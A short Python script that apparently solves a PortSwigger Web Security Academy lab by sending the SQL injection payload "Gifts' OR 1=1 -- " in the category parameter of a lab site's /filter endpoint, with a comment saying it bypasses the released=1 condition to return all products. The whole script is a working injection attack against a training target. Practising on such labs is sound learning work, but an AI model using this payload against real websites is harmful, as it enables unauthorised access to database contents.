import requests

site = '0ab700b503b0d8f0802d083c003a00a3.web-security-academy.net'
s = requests.Session()

def try_category(category_string):
    url = f'https://{site}/filter?category={category_string}'
    resp = s.get(url)
    print(resp.text)

# Final payload to break SQL syntax, bypass released=1 condition, and return all products
try_category("""Gifts' OR 1=1 -- """)